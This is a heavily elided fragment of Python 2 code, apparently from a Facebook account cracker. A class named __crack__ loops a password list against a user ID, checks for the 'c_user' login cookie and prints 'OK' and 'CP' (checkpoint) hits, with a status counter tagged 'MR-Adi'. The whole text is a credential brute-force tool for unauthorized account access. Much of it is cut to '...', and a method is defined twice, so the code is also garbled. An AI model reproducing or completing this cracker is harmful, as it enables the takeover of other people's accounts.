...
class __crack__:
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                ...
                print '\r%s[Adi-OK]    %s     | %s   %s' % (H, user, pw, N)
                ...
                try:
                    ...
                    print '\r%s[Adi-CP]   %s   | %s | %s %s %s %s' % (K, user, pw, day, month, year, N)
                ...
                print '\r%s[Adi-CP]    %s     | %s %s' % (K, user, pw, N)
    ...
    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92m\xe2\x99\xa1%s] [MR-Adi] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
